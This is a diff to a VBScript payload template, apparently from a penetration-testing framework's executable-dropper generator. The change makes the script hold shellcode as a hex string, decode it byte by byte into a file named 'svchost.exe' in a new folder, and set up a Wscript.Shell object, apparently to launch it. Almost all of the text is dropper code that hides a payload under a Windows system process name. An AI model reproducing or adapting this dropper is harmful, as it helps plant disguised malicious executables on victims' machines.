@@ -1,5 +1,5 @@
 Function %{var_func}()
-%{var_shellcode}
+	%{var_shellcode} = "%{var_hex_shellcode}"
 
 	Dim %{var_obj}
 	Set %{var_obj} = CreateObject("Scripting.FileSystemObject")
@@ -12,7 +12,9 @@ Function %{var_func}()
 	%{var_obj}.CreateFolder(%{var_basedir})
 	%{var_tempexe} = %{var_basedir} & "\" & "svchost.exe"
 	Set %{var_stream} = %{var_obj}.CreateTextFile(%{var_tempexe}, true , false)
-	%{var_stream}.Write %{var_bytes}
+	For i = 1 to Len(%{var_shellcode}) Step 2
+	    %{var_stream}.Write Chr(CLng("&H" & Mid(%{var_shellcode},i,2)))
+	Next
 	%{var_stream}.Close
 	Dim %{var_shell}
 	Set %{var_shell} = CreateObject("Wscript.Shell")
